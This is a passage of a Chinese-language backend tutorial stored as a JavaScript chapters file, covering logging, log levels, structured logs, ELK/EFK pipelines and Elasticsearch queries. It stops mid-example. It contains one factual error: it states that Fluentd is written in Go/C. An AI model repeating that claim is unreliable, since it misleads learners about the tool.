// =============================================================
// 后端开发综合教程 —— 第八批章节（分布式与工程化后 5 章）
// -------------------------------------------------------------
// 本文件包含以下章节：
//   1. backend-log      — 日志与 ELK
//   2. backend-monitor  — 监控与 Prometheus
//   3. backend-tracing  — 分布式链路追踪
//   4. backend-deploy   — 部署与 CI/CD
//   5. backend-ha       — 高可用架构
//
// 每个章节包含：
//   id      : 唯一标识
//   group   : 分组名（分布式与工程化）
//   icon    : 展示用 emoji
//   title   : 章节标题
//   content : Markdown 格式的详细讲解（语言无关原理 + 多语言伪代码对照）
//   code    : 可直接运行的 Node.js 代码（沙箱内执行，用内存结构模拟网络/服务）
//
// 代码运行环境约束（沙箱）：
//   - 仅可 require: fs, path, os, url, crypto, util, events, stream,
//     buffer, querystring, string_decoder, zlib, assert, timers
//   - 没有 http / net / child_process / dns / elasticsearch，概念用
//     内存数据结构模拟
//   - 全局: console, process, Buffer, setTimeout, Promise, URL 等
//   - 支持 top-level await，用 console.log 输出结果
// =============================================================

export const chapters = [
  // =========================================================
  // 第一章：日志与 ELK
  // =========================================================
  {
    id: "backend-log",
    group: "分布式与工程化",
    icon: "📝",
    title: "日志与 ELK",
    content: `## 日志与 ELK

**日志（Logging）** 是后端系统最古老、却永远不会过时的可观测性手段。当系统在线上出现故障时，日志往往是工程师手里唯一的"案发现场记录"——它告诉你故障发生前发生了什么、发生时系统处于什么状态、发生后又引发了什么连锁反应。一个没有日志的系统，就像一个没有黑匣子的飞机：平时一切正常，一旦出事却无从查起。

本章将从日志的价值出发，逐层讲解日志级别规范、结构化日志、日志最佳实践、主流日志框架对比、ELK/EFK 采集架构、Elasticsearch 检索原理、查询 DSL 实战、保留策略、告警，以及常见的日志反模式。

### 一、日志的价值

很多人把日志理解为"打印点东西方便调试"，这只是日志最浅层的用途。在生产环境中，日志承担着至少五项关键职责：

#### 1.1 故障排查（Troubleshooting）

这是日志最核心的价值。当线上出现"下单失败""支付超时""用户登录报错"等问题时，工程师需要快速定位根因。日志记录了请求处理过程中的关键节点：参数校验是否通过、数据库查询耗时、调用了哪些下游、异常堆栈是什么。没有这些信息，故障排查只能靠"猜"。

好的故障排查日志应该形成一条"故事线"：请求进入时记录入口参数，处理过程中记录关键决策点（如"库存不足""余额校验失败"），异常时记录完整堆栈，结束时记录响应结果。配合 traceId，工程师可以顺着这条故事线还原整个请求的执行路径。

一个真实的例子：某电商系统在凌晨出现间歇性支付失败，工程师通过日志发现所有失败请求都经过了一个特定的支付通道，且失败前都有一条"通道响应超时"的 WARN 日志。根因是该通道在凌晨做批处理导致响应变慢。如果没有日志，这个问题可能要花几天才能定位。

#### 1.2 安全审计（Audit）

审计日志记录"谁在什么时间做了什么操作"，是安全合规的基础。金融系统必须记录每一笔转账的发起人、金额、时间、IP；后台管理系统必须记录管理员的每一次敏感操作（修改配置、删除数据、导出用户信息）。

审计日志有严格的要求：
- **不可篡改**：通常写入只追加（append-only）的存储，甚至上链或写入 WORM（Write Once Read Many）介质。
- **完整记录**：操作前后的数据快照、操作人、操作时间、来源 IP、操作结果。
- **长期保留**：金融行业通常要求保留 5-7 年，等保要求至少 6 个月。
- **独立存储**：审计日志与业务日志分离，避免业务日志清理时丢失审计记录。

#### 1.3 业务分析（Analytics）

日志中蕴含着丰富的业务信息。用户的搜索关键词、页面访问路径、功能使用频率、点击行为，都可以通过日志采集后进行分析，为产品决策提供依据。虽然现在很多公司用专门的行为分析系统（如神策、Mixpanel），但这些系统的数据源往往还是日志或埋点。

例如，通过分析搜索日志可以发现"搜索无结果"的高频词，从而优化商品库；通过分析接口调用日志可以发现哪些 API 使用率低，可以考虑下线。

#### 1.4 监控告警（Monitoring）

日志是监控的重要数据源。错误日志的突增可以触发告警；特定关键词的出现（如 "OutOfMemoryError" "Connection refused"）可以触发告警；日志中提取的指标（如每分钟 ERROR 数）可以绘制监控曲线。

Prometheus 等监控系统主要采集结构化指标，但有些信息只能从日志中获取，如异常堆栈的具体内容、业务错误的详细信息。因此"日志告警"和"指标告警"通常是互补的。

#### 1.5 合规与法律（Compliance）

很多行业对日志有强制性要求。PCI-DSS（支付卡行业）要求记录所有对持卡人数据的访问；HIPAA（医疗）要求记录患者信息的访问；GDPR（欧盟隐私）要求能够追溯个人数据的处理过程；中国的《网络安全法》和等保 2.0 要求日志保留至少 6 个月。

这些合规要求不仅是"要有日志"，还涉及日志的完整性、保密性、可追溯性。例如，日志中不能明文记录信用卡号，访问日志要能追溯到具体人员。

---

### 二、日志级别规范

日志级别（Log Level）是用来区分日志重要性的标签。合理使用级别，可以让工程师在海量日志中快速过滤出关心的信息：排查问题时只看 ERROR 和 WARN，调试时打开 DEBUG，了解系统状态时看 INFO。

#### 2.1 五个标准级别

业界通用的日志级别从低到高依次是：

| 级别 | 含义 | 使用场景 | 示例 |
|------|------|----------|------|
| DEBUG | 调试信息 | 开发调试、详细执行流程，生产默认关闭 | "查询参数: {id: 123, status: 'active'}" |
| INFO | 关键流程信息 | 请求处理、状态变更、启动停止等正常业务节点 | "订单 12345 创建成功" |
| WARN | 警告 | 异常但可恢复的情况，需关注但不影响当前请求 | "缓存未命中，回源数据库" "重试第 2 次" |
| ERROR | 错误 | 系统错误，影响当前请求但系统仍可运行 | "数据库连接失败" "下游服务超时" |
| FATAL | 致命错误 | 系统无法继续运行，需要立即人工介入 | "无法加载核心配置" "磁盘满" |

有些系统还定义了 TRACE（比 DEBUG 更细）和 OFF（关闭所有日志），但最常用的是上述五级。

#### 2.2 各级别的使用原则

**DEBUG**：只在开发调试时使用，记录详细的变量值、循环迭代、分支选择。生产环境必须关闭，否则日志量会爆炸。DEBUG 日志应该"多多益善"——任何你想知道的信息都可以记，因为生产环境看不到。

\`\`\`java
// Java - DEBUG 日志示例
logger.debug("查询用户列表, 参数: page={}, size={}, filter={}", page, size, filter);
logger.debug("SQL 执行: {} 耗时: {}ms", sql, elapsed);
\`\`\`

\`\`\`go
// Go - DEBUG 日志示例
log.Debug().Int("page", page).Int("size", size).Msg("查询用户列表")
\`\`\`

**INFO**：记录系统的"生命周期事件"和"关键业务节点"。判断标准是：这条日志对了解系统运行状态是否有帮助？如果去掉它，运维人员能否知道系统在干什么？INFO 不应该太频繁，避免淹没真正重要的信息。

合适的 INFO 日志：
- 服务启动、停止、配置加载完成
- 请求处理的关键节点（如订单创建、支付完成）
- 定时任务的执行开始和结束
- 配置变更、灰度发布切换

不合适的 INFO 日志（太频繁）：
- 每次循环迭代都打一条
- 每次缓存命中都打一条
- 高频接口的每次请求都打一条（应该用 access log 或采样）

**WARN**：记录"异常但可恢复"的情况。这是最容易被滥用的级别。判断标准是：系统遇到了预期之外的情况，但通过重试、降级、回退等机制处理了，请求仍能完成。WARN 应该被监控——频繁的 WARN 往往预示着即将发生的故障。

典型 WARN 场景：
- 重试成功（"第 2 次重试成功"）
- 降级触发（"支付通道不可用，降级到备用通道"）
- 接近阈值（"连接池使用率 85%，接近上限"）
- 非预期输入但已处理（"用户提交了非法的状态值，已重置为默认"）

**ERROR**：记录"影响当前请求"的错误。判断标准是：这个请求没能正常完成，或者完成了但结果可能不正确。ERROR 不应该包含"正常预期的业务异常"——如"用户名密码错误""库存不足"是业务逻辑，不是系统错误，不应记 ERROR。

ERROR 日志必须包含足够的上下文来定位问题：发生了什么、在哪个模块、输入是什么、异常堆栈是什么。一条好的 ERROR 日志：

\`\`\`python
# Python - ERROR 日志示例
logger.error(
    "订单创建失败",
    extra={
        "user_id": user_id,
        "order_data": order_data,
        "trace_id": trace_id,
    },
    exc_info=True  # 自动记录异常堆栈
)
\`\`\`

**FATAL**：记录"系统无法继续运行"的致命错误。触发 FATAL 通常意味着进程要退出或需要立即重启。使用要非常谨慎——一旦打了 FATAL，on-call 工程师就会被叫醒。典型场景：核心配置加载失败、数据库连不上且无法降级、内存耗尽、端口被占用且无法重试。

#### 2.3 级别选择的常见误区

- **业务异常当系统错误**：用户登录密码错误、库存不足、参数校验失败，这些都是业务逻辑的正常分支，不应记 ERROR。记 INFO 或专门的业务日志即可。把业务异常记成 ERROR 会导致错误率虚高，掩盖真正的系统错误。
- **WARN 当 ERROR 用**：有些工程师怕"漏掉问题"，把所有异常都记 ERROR。结果 ERROR 日志满天飞，真正的严重错误被淹没。
- **级别太低**：该记 ERROR 的记成 INFO，导致告警不触发，问题被忽略。
- **在循环里打 INFO/ERROR**：循环内打日志容易导致日志量爆炸，应该聚合后打一条汇总。

---

### 三、结构化日志 vs 非结构化日志

#### 3.1 非结构化日志（传统方式）

非结构化日志是人类可读的自由文本：

\`\`\`
2024-01-15 10:23:45 INFO  OrderService - 用户 user_123 创建订单 order_456, 金额 99.00 元
2024-01-15 10:23:46 ERROR PaymentService - 支付失败: 通道超时, 订单 order_456
\`\`\`

优点：人类直接可读，调试方便。
缺点：
- **机器难以解析**：要提取"订单号"需要写正则，正则容易出错且性能差。
- **格式不统一**：不同开发者写的格式不同，解析规则要维护多套。
- **难以搜索**：要搜"所有金额大于 100 的订单日志"几乎不可能。
- **字段缺失**：没有强制要求包含哪些字段，容易遗漏关键信息。

#### 3.2 结构化日志（JSON 格式）

结构化日志以 JSON 等机器可解析格式输出：

\`\`\`json
{"timestamp":"2024-01-15T10:23:45Z","level":"INFO","service":"order-service","traceId":"a1b2c3","userId":"user_123","event":"order_created","orderId":"order_456","amount":99.00}
{"timestamp":"2024-01-15T10:23:46Z","level":"ERROR","service":"payment-service","traceId":"a1b2c3","orderId":"order_456","error":"channel_timeout","stack":"..."}
\`\`\`

优点：
- **机器可解析**：任何日志系统都能直接解析 JSON。
- **字段可搜索**：可以按 service、level、traceId、userId 等字段精确过滤。
- **格式统一**：强制结构，避免格式不一致。
- **可扩展**：新增字段不影响已有解析逻辑。
- **适合聚合**：可以按字段 group by 统计。

缺点：
- 人类直接阅读不如文本直观（但 Kibana 等工具可以格式化展示）。
- 体积略大（字段名重复）。

现代后端系统几乎都采用结构化日志。ELK、Loki、Splunk 等日志平台都原生支持 JSON。

#### 3.3 结构化日志的必备字段

一条合格的结构化日志应包含以下字段：

| 字段 | 说明 | 示例 |
|------|------|------|
| timestamp | 时间戳（ISO8601 或毫秒） | 2024-01-15T10:23:45.123Z |
| level | 日志级别 | INFO |
| service | 服务名 | order-service |
| traceId | 链路追踪 ID | a1b2c3d4e5f6 |
| spanId | span ID（可选） | span_789 |
| requestId | 请求 ID | req_abc123 |
| userId | 用户 ID（如有） | user_123 |
| method | HTTP 方法（如适用） | POST |
| path | 请求路径（如适用） | /api/orders |
| status | 响应状态码（如适用） | 200 |
| duration | 耗时（毫秒） | 45 |
| message | 人类可读消息 | 订单创建成功 |
| ... | 业务字段 | orderId, amount 等 |

traceId 是最重要的字段之一——它能把一次请求在不同服务、不同函数中的日志串联起来，形成完整的执行链路。

---

### 四、日志最佳实践

#### 4.1 必须包含的关键字段

每条日志都应包含足够的信息让读者"不看代码也能理解发生了什么"。一个经典原则是"5W1H"：
- **When**：timestamp
- **Where**：service + 代码位置（类名/方法名/文件名行号）
- **Who**：userId / requestId / traceId
- **What**：发生了什么事件（message + event 字段）
- **Why**：为什么（如失败原因 error）
- **How**：如何处理的（如"重试 3 次后成功""降级到缓存"）

#### 4.2 不要记录敏感信息

这是日志安全的红线。以下信息绝对不能明文记录：
- 密码、密钥、Token、Session ID
- 信用卡号、CVV
- 身份证号、手机号（如必须记录要脱敏，如 138****8888）
- 邮箱（部分场景需脱敏）
- 个人健康信息

\`\`\`javascript
// ❌ 错误：记录了密码
logger.info('用户登录', { username, password });

// ✅ 正确：脱敏或忽略敏感字段
logger.info('用户登录', { username, password: '***' });
\`\`\`

很多日志框架支持自动脱敏，如 Java Logback 的 MaskingPatternLayout，可以按正则自动遮盖信用卡号、手机号等。

#### 4.3 不要在循环里打日志

循环内打日志会导致日志量随循环次数线性增长。如果循环 10000 次每次打一条 INFO，就会产生 10000 条日志，既浪费存储又淹没有用信息。

\`\`\`javascript
// ❌ 错误：循环内打日志
for (const item of items) {
  logger.info('处理项目', { id: item.id });  // 可能产生上万条
  process(item);
}

// ✅ 正确：循环外打汇总
let success = 0, fail = 0;
for (const item of items) {
  try { process(item); success++; }
  catch (e) { fail++; logger.error('处理失败', { id: item.id, error: e.message }); }
}
logger.info('批量处理完成', { total: items.length, success, fail });
\`\`\`

如果确实需要在循环内记录（如调试），用 DEBUG 级别，生产环境关闭。

#### 4.4 异步打日志避免阻塞

日志写入（尤其是写文件或发网络）是 IO 操作，可能阻塞业务线程。生产环境应使用异步日志：
- **Java Log4j2 AsyncLogger**：基于 Disruptor 的无锁异步，吞吐量可达百万级。
- **Python logging.handlers.QueueHandler**：把日志放入队列，单独线程消费。
- **Node.js Pino**：默认异步，极低开销。
- **Logback AsyncAppender**：把日志事件放入 BlockingQueue，单独线程写。

异步日志的代价是：进程崩溃时，队列中未写出的日志会丢失。对于审计日志这种不能丢失的场景，要么用同步，要么用可靠的队列（如 Kafka）。

#### 4.5 合理采样

对于高频日志（如每次请求都打一条），可以采样：只记录 1% 或千分之一的请求。但要注意：
- **错误必须全量记录**：ERROR 及以上不采样。
- **采样要可追溯**：记录采样率，便于估算总量。
- **采样要均匀**：不要只在某个时间段采样。

#### 4.6 日志内容要准确

- **记录实际值，不要记录"应该的值"**：如"重试了 3 次"要记录真实重试次数，不要硬编码。
- **异常要记完整堆栈**：只记 message 不记堆栈是日志反模式，无法定位问题。
- **时间戳要准确**：用服务器时间，不要用日志采集时间。要用 UTC 或明确时区。

---

### 五、日志框架对比

#### 5.1 Java 日志框架

Java 日志生态最复杂，经历了很多演进：

- **Log4j**：最早的日志框架（2001 年），已被 Log4j2 取代。
- **Logback**：Log4j 作者的下一代作品，Spring Boot 默认。性能好、配置灵活、与 SLF4J 原生集成。
- **Log4j2**：Apache 重新设计，支持异步日志（基于 Disruptor），性能极高。2021 年的 Log4Shell 漏洞（CVE-2021-44228）让它"出圈"——JNDI 注入导致 RCE，教训是不要在日志里记录并解析用户输入。
- **SLF4J**：日志门面（Facade），定义 API，底层可切换 Logback/Log4j2 等。解耦日志 API 和实现。
- **JUL（java.util.logging）**：JDK 自带，功能弱，基本不用。

推荐组合：**SLF4J + Logback**（Spring Boot 默认）或 **SLF4J + Log4j2**（追求极致性能）。

Logback 配置示例（logback-spring.xml）：

\`\`\`xml
<configuration>
  <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
    <encoder>
      <pattern>%d{ISO8601} %-5level [%thread] %logger{36} - %msg%n</pattern>
    </encoder>
  </appender>
  <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
    <file>logs/app.log</file>
    <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
      <fileNamePattern>logs/app.%d{yyyy-MM-dd}.log</fileNamePattern>
      <maxHistory>30</maxHistory>
    </rollingPolicy>
    <encoder class="ch.qos.logback.classic.encoder.PatternLayoutEncoder">
      <pattern>{"timestamp":"%d","level":"%level","logger":"%logger","msg":"%msg"}%n</pattern>
    </encoder>
  </appender>
  <root level="INFO">
    <appender-ref ref="STDOUT"/>
    <appender-ref ref="FILE"/>
  </root>
</configuration>
\`\`\`

#### 5.2 Python 日志框架

Python 标准库自带 \`logging\` 模块，功能完备。结构化日志推荐 \`structlog\` 或 \`python-json-logger\`。

\`\`\`python
import logging
import json
from pythonjsonlogger import jsonlogger

logger = logging.getLogger("order-service")
handler = logging.StreamHandler()
handler.setFormatter(jsonlogger.JsonFormatter(
    '%(timestamp)s %(level)s %(name)s %(message)s'
))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

logger.info("订单创建", extra={"orderId": "456", "userId": "123", "amount": 99.0})
\`\`\`

#### 5.3 Node.js 日志框架

- **Winston**：最流行的 Node.js 日志库，功能全面，支持多 transport（console/file/http），但性能一般。
- **Pino**：主打极致性能，默认输出 JSON，异步写入，比 Winston 快 5-10 倍。Node.js 生态首选。
- **Bunyan**：JSON 优先，但已不再活跃维护。
- **Log4js**：模仿 Log4j 的 Node.js 版，配置类似。

Pino 性能高的原因：所有日志格式化在单独的线程（worker thread）进行，主线程只做最小的字符串拼接。生产环境推荐 Pino。

Pino 示例：

\`\`\`javascript
const pino = require('pino');
const logger = pino({
  level: 'info',
  base: { service: 'order-service' },
  timestamp: pino.stdTimeFunctions.isoTime,
});

logger.info({ orderId: '456', userId: '123', amount: 99.0 }, '订单创建');
\`\`\`

#### 5.4 Go 日志框架

- **zerolog**：零分配（zero-allocation）日志库，性能极高。
- **zap**：Uber 开源，结构化日志，性能优秀，生态好。
- **logrus**：早期流行，但性能不如 zap/zerolog，现在新项目少用。
- **slog**：Go 1.21 标准库新增的结构化日志，官方推荐，未来趋势。

zap 示例：

\`\`\`go
package main

import "go.uber.org/zap"

func main() {
    logger, _ := zap.NewProduction()
    defer logger.Sync()
    logger.Info("订单创建",
        zap.String("orderId", "456"),
        zap.String("userId", "123"),
        zap.Float64("amount", 99.0),
    )
}
\`\`\`

#### 5.5 性能对比

日志框架的性能差异主要体现在吞吐量和内存分配。以输出 10 万条 JSON 日志为例（大致量级，仅供参考）：

| 框架 | 语言 | 吞吐量（ops/s） | 备注 |
|------|------|-----------------|------|
| Log4j2 AsyncLogger | Java | ~2,000,000 | 基于 Disruptor 无锁 |
| Logback Async | Java | ~800,000 | BlockingQueue |
| zerolog | Go | ~1,500,000 | 零分配 |
| zap | Go | ~1,000,000 | 高性能 |
| Pino | Node.js | ~700,000 | 异步 worker |
| Winston | Node.js | ~100,000 | 同步格式化 |
| Python logging | Python | ~50,000 | GIL 限制 |

注意：性能数字受测试条件影响很大，仅作量级参考。生产环境中，日志框架很少成为瓶颈，但高频日志场景（如网关）需要关注。

---

### 六、日志采集架构 ELK/EFK 详解

单机日志用 \`tail -f\` 就能看，但生产环境有几十上百台机器，每台每秒产生上千条日志，必须用集中化的日志系统。ELK 是最流行的方案。

#### 6.1 ELK 架构总览

ELK 是三个开源项目的缩写：**E**lasticsearch（存储+搜索）、**L**ogstash（采集+处理）、**K**ibana（展示）。后来加入了 Beats（轻量采集器），现在官方叫 Elastic Stack，但大家还是习惯叫 ELK。

完整的数据流：

\`\`\`
应用服务器 → Filebeat(采集) → Kafka(缓冲) → Logstash(处理) → Elasticsearch(存储) → Kibana(展示)
\`\`\`

每个环节的职责：

**Filebeat（采集器）**：
- 部署在每台应用机器上，读取日志文件（如 /var/log/app/*.log）。
- 轻量（Go 写的，几 MB 内存），不影响应用。
- 实时追踪文件位置（记录读取偏移量 registry），重启不丢数据。
- 支持多行合并（如 Java 异常堆栈是多行，要合并成一条）。
- 把日志发送到 Kafka 或直接发 Logstash。

**Kafka（缓冲）**：
- 日志洪峰时（如大促），Filebeat 产出速度可能超过 Logstash 处理速度。
- Kafka 作为缓冲区，削峰填谷，防止 Logstash 被压垮。
- 日志量不大时可以省略 Kafka，Filebeat 直连 Logstash。
- Kafka 还能重放：如果 ES 故障，日志先堆积在 Kafka，ES 恢复后继续消费。

**Logstash（处理器）**：
- 接收日志，做过滤、解析、转换。
- 解析 JSON、正则提取字段（grok）、日期格式化、字段重命名、添加固定字段（如环境、机房）。
- 输出到 Elasticsearch。
- 缺点：基于 JRuby，资源消耗大（JVM），处理性能有限。所以现在很多场景用 Fluentd/Vector 替代。

**Elasticsearch（存储+搜索）**：
- 分布式搜索引擎，存储日志并提供全文检索。
- 倒排索引支持快速搜索。
- 支持按时间分索引（如 logs-2024-01-15），便于按时间删除老数据。

**Kibana（展示）**：
- Web 界面，查询和可视化日志。
- Discover 页面搜索日志，Dashboard 画图表，Alerting 配置告警。

#### 6.2 EFK 架构

EFK 把 Logstash 换成 **Fluentd**（或 Fluent Bit）：
- Fluentd 同样用 Go/C 写，比 Logstash 轻量，资源占用低。
- Fluent Bit 是 Fluentd 的轻量版，更适合边缘采集。
- Kubernetes 生态默认用 Fluentd/Fluent Bit。

#### 6.3 Filebeat 配置示例

\`\`\`yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/app/*.log
  fields:
    service: order-service
    env: production
  fields_under_root: true
  multiline.pattern: '^\\d{4}-\\d{2}-\\d{2}'  # 以日期开头的行作为新日志
  multiline.negate: true
  multiline.match: after

output.kafka:
  hosts: ["kafka1:9092", "kafka2:9092"]
  topic: "app-logs"
  partition.round_robin:
    reachable_only: true

logging.level: info
\`\`\`

#### 6.4 Logstash 配置示例

\`\`\`
input {
  kafka {
    bootstrap_servers => "kafka1:9092"
    topics => ["app-logs"]
  }
}

filter {
  json {
    source => "message"
  }
  date {
    match => ["timestamp", "ISO8601"]
    target => "@timestamp"
  }
  mutate {
    add_field => { "datacenter" => "bj-east" }
  }
}

output {
  elasticsearch {
    hosts => ["es1:9200", "es2:9200"]
    index => "logs-%{service}-%{+YYYY.MM.dd}"
  }
}
\`\`\`

---

### 七、Elasticsearch 日志检索原理

#### 7.1 倒排索引

Elasticsearch 之所以能快速搜索海量日志，核心是**倒排索引（Inverted Index）**。

传统索引（正排）：文档 ID → 文档内容。要找包含"error"的文档，要遍历所有文档，O(N)。
倒排索引：词项 → 文档 ID 列表。要找包含"error"的文档，直接查"error"对应的文档列表，O(1)。

建立倒排索引的过程：
1. **分词（Analysis）**：把文本切分成词项。如 "Order creation failed" → ["order", "creation", "failed"]。
2. **归一化**：小写化、去停用词、词干提取。如 "Failed" → "failed"。
3. **构建映射**：词项 → 包含它的文档 ID 列表。

\`\`\`
倒排表示例：
order    → [1, 5, 8, 12]
creation → [1, 3]
failed   → [5, 8, 9, 12]
\`\`\`

搜索 "order failed"：取 order 和 failed 的文档列表交集 → [5, 8, 12]。

#### 7.2 分词器（Analyzer）

分词器决定了文本如何被切分，直接影响搜索效果。ES 常用分词器：
- **standard**：默认，按 Unicode 分词，小写化，适合英文和中文单字。
- **whitespace**：按空格分词。
- **keyword**：不分词，整个作为一个词项。
- **ik_max_word / ik_smart**：中文分词器，需要安装 IK 插件。

日志场景通常用 standard，但如果日志是 JSON，每个字段是 keyword（精确匹配）更合适，避免 "order_456" 被切成 "order" 和 "456"。

#### 7.3 全文搜索 vs 精确匹配

- **全文搜索（full text）**：对 text 类型字段，分词后匹配。如搜索 message 字段里的 "timeout"。
- **精确匹配（exact value）**：对 keyword 类型字段，不分析，精确匹配。如按 orderId="order_456" 过滤。

日志中，traceId、userId、service 等字段应为 keyword（精确匹配）；message 字段可为 text（全文搜索）。

---

### 八、日志查询 DSL 实战

Elasticsearch 用 JSON 查询 DSL（Domain Specific Language）查询。Kibana 的搜索框本质上是生成 DSL。

#### 8.1 match 查询（全文搜索）

\`\`\`json
// 在 message 字段搜索 "payment timeout"
GET /logs-*/_search
{
  "query": {
    "match": {
      "message": "payment timeout"
    }
  }
}
\`\`\`

match 会对查询词分词，搜索包含 "payment" 或 "timeout" 的文档。要 AND 关系用 match_phrase 或 operator。

\`\`\`json
{
  "query": {
    "match_phrase": {
      "message": "payment timeout"
    }
  }
}
\`\`\`

#### 8.2 term 查询（精确匹配）

\`\`\`json
// 查询 traceId 为 a1b2c3 的日志
{
  "query": {
    "term": {
      "traceId": "a1b2c3"
    }
  }
}
\`\`\`

term 不分词，适合 keyword 字段。注意：如果字段是 text 类型，term 可能匹配不到（因为存储时已分词）。

#### 8.3 range 查询（范围）

\`\`\`json
// 查询耗时大于 500ms 的日志
{
  "query": {
    "range": {
      "duration": { "gt": 500 }
    }
  }
}

// 查询最近 15 分钟的日志
{
  "query": {
    "range": {
      "@timestamp": {
        "gte": "now-15m",
        "lte": "now"
      }
    }
  }
}
\`\`\`

#### 8.4 bool 查询（组合）

bool 查询用 must（AND）、should（OR）、must_not（NOT）、filter（过滤，不评分）组合：

\`\`\`json
// 查询 order-service 的 ERROR 日志，且 traceId 为 a1b2c3
{
  "query": {
    "bool": {
      "filter": [
        { "term": { "service": "order-service" } },
        { "term": { "level": "ERROR" } },
        { "term": { "traceId": "a1b2c3" } }
      ]
    }
  }
}
\`\`\`

用 filter 而非 must：filter 不计算相关性评分，性能更好，且有缓存。日志查询通常不需要评分，应优先用 filter。

#### 8.5 聚合查询

\`\`\`json
// 按服务统计 ERROR 数量
{
  "size": 0,
  "query": { "term": { "level": "ERROR" } },
  "aggs": {
    "errors_by_service": {
      "terms": { "field": "service", "size": 10 }
    }
  }
}
\`\`\`

\`\`\`json
// 按时间分桶统计每分钟错误数
{
  "size": 0,
  "aggs": {
    "errors_over_time": {
      "date_histogram": {
        "field": "@timestamp",
        "fixed_interval": "1m"
      }
    }
  }
}
\`\`\`

---

### 九、日志保留策略

日志不能无限保存，否则磁盘扛不住。保留策略要平衡"排查需求"和"成本"。

#### 9.1 冷热数据分离

- **热数据**：最近 7 天，存在 SSD 节点，查询频繁，要求快。
- **温数据**：7-30 天，存在 HDD 节点，偶尔查询。
- **冷数据**：30-90 天，存在对象存储（如 S3/OSS），很少查询，成本低。

ES 的 ILM（Index Lifecycle Management）自动管理索引生命周期：

\`\`\`json
{
  "policy": {
    "phases": {
      "hot": { "actions": { "rollover": { "max_age": "1d", "max_size": "50gb" } } },
      "warm": {
        "min_age": "7d",
        "actions": { "allocate": { "include": { "data": "warm" } } }
      },
      "cold": {
        "min_age": "30d",
        "actions": { "freeze": {} }
      },
      "delete": {
        "min_age": "90d",
        "actions": { "delete": {} }
      }
    }
  }
}
\`\`\`

#### 9.2 归档到对象存储

超期日志归档到 OSS/S3，按需恢复查询。ES 的可搜索快照（Searchable Snapshot）可以直接在 S3 上查询冷数据，但慢。

#### 9.3 保留期限建议

| 日志类型 | 保留期 | 原因 |
|----------|--------|------|
| 应用日志（INFO+） | 30 天 | 排查近期问题 |
| 应用日志（ERROR） | 90 天 | 长期问题追溯 |
| 访问日志 access log | 7-30 天 | 流量分析 |
| 审计日志 | 1-7 年 | 合规要求 |
| 安全日志 | 6 个月-1 年 | 等保要求 |

审计日志保留最久，应单独存储（甚至用专门的审计系统），不与应用日志混存。

---

### 十、日志告警

日志不仅要能查，还要能"主动报警"。

#### 10.1 Elastalert

Elastalert 是 Yelp 开源的 ES 告警工具，支持多种规则：
- **frequency**：某查询在时间窗口内出现次数超阈值。如 5 分钟内 ERROR 超过 100 次。
- **spike**：当前频率与参考频率比值超阈值。如错误率突增 3 倍。
- **flatline**：某事件少于阈值。如 5 分钟内没有心跳日志，可能服务挂了。
- **any**：任何匹配即告警。如出现 "OutOfMemoryError" 立即告警。

#### 10.2 Kibana Alerting

ES 7.x 后内置告警（Alerting），在 Kibana 配置，无需额外组件。支持 Threshold、Anomaly、Inventory 等规则类型，告警动作支持邮件、Webhook、Slack、PagerDuty。

#### 10.3 告警规则示例

典型的日志告警规则：
- ERROR 日志 5 分钟内 > 50 条 → P2 告警
- 出现 "OutOfMemoryError"/"FATAL" 关键词 → P0 告警
- 某服务 5 分钟内无 INFO 日志 → P1（可能服务挂了）
- 错误率（ERROR/总请求）> 5% → P1 告警

告警要避免噪声：设置合理的阈值、做时间窗口聚合、设置告警间隔（如同一问题 1 小时内只告警一次）。

---

### 十一、常见日志反模式

#### 11.1 用 System.out.println 打日志

\`\`\`java
System.out.println("用户登录: " + username);  // ❌
\`\`\`

问题：
- 无法控制级别、无法关闭、无法路由到文件。
- 性能差（synchronized）。
- 无法采集。

要用日志框架，不要用 print。

#### 11.2 记录敏感信息

前文已述，密码、Token 等绝对不能明文记录。要用专门的脱敏工具。

#### 11.3 日志吞异常

\`\`\`java
try { ... }
catch (Exception e) {
    log.error("出错了");  // ❌ 丢了异常信息
}
\`\`\`

正确做法是记录异常堆栈：

\`\`\`java
catch (Exception e) {
    log.error("出错了", e);  // ✅ 带堆栈
}
\`\`\`

#### 11.4 日志过多导致磁盘满

生产事故：某服务 DEBUG 没关，一晚上产生 200GB 日志，磁盘满了导致服务挂掉。要监控磁盘使用率，日志框架配置滚动+保留策略。

#### 11.5 无 traceId 无法串联

\`\`\`
[service-a] 收到请求
[service-b] 处理订单
[service-c] 调用支付
\`\`\`

这三条日志分属不同服务，没有 traceId 无法知道是同一个请求。必须用链路追踪（见下一章）把 traceId 注入每条日志。

#### 11.6 日志格式不统一

不同服务日志格式不同，解析困难。要制定统一的日志规范，所有服务遵守。

#### 11.7 日志里拼接字符串浪费性能

\`\`\`java
log.debug("用户: " + user.getName() + " 下单: " + order);  // ❌ 即使 DEBUG 关闭也会拼接
log.debug("用户: {} 下单: {}", user.getName(), order);  // ✅ 占位符，级别不满足不拼接
\`\`\`

---

### 十二、Access Log 与业务日志分离

**访问日志（access log）** 记录每个 HTTP 请求的元信息：方法、路径、状态码、耗时、IP、UA。它和业务日志（应用运行中产生的日志）关注点不同，应分离：

- **access log**：高频、格式统一、用于流量分析和监控。通常一份一个服务一个文件，按天滚动。
- **业务日志**：低频、内容多样、用于排查和审计。

Nginx access log 格式：

\`\`\`
log_format main '$remote_addr - $remote_user [$time_local] '
                '"$request" $status $body_bytes_sent '
                '"$http_referer" "$http_user_agent" '
                'rt=$request_time uct=$upstream_connect_time';
\`\`\`

应用层 access log（如 Spring Boot 的 CommonRequestLoggingFilter、Node.js 的 morgan）也类似。这些日志是计算 QPS、错误率、延迟分布的基础。

---

### 十三、多语言日志库配置示例对照

#### Java（SLF4J + Logback，结构化 JSON）

\`\`\`java
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;

Logger logger = LoggerFactory.getLogger(OrderService.class);
MDC.put("traceId", traceId);
MDC.put("userId", userId);
logger.info("订单创建 orderId={} amount={}", orderId, amount);
MDC.clear();
\`\`\`

MDC（Mapped Diagnostic Context）是线程上下文，日志输出时自动带上 traceId 等。

#### Go（zap）

\`\`\`go
logger, _ := zap.NewProduction()
defer logger.Sync()
// 用 context 传递 traceId
ctx = context.WithValue(ctx, "traceId", traceId)
logger.Info("订单创建",
    zap.String("traceId", traceId),
    zap.String("orderId", orderId),
